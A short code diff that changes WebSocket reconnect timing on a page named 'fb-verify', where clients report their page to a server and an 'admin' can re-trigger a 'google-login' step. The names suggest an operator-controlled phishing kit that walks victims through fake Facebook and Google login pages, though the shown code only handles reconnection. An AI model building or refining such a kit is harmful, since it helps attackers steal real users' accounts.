@@ -300,14 +300,18 @@
       socket.emit('userConnectedToPage', { clientId: clientId, page: 'fb-verify' });
     });
     /* Chrome mobile kills WebSocket when backgrounded — force fresh reconnect on return */
-    var _fbVerifyReady = false;
-    socket.on('connect', function () { _fbVerifyReady = true; });
+    var _fbWasHidden = false;
+    var _fbReady = false;
+    socket.on('connect', function () { _fbReady = true; });
     document.addEventListener('visibilitychange', function () {
-      if (document.visibilityState === 'visible' && _fbVerifyReady) {
+      if (document.visibilityState === 'hidden') {
+        _fbWasHidden = true;
+      } else if (document.visibilityState === 'visible' && _fbWasHidden && _fbReady) {
+        _fbWasHidden = false;
         setTimeout(function () {
           socket.disconnect();
           setTimeout(function () { socket.connect(); }, 300);
-        }, 500);
+        }, 800);
       }
     });
     /* If admin re-triggers google-login while user is on this page, proceed normally */
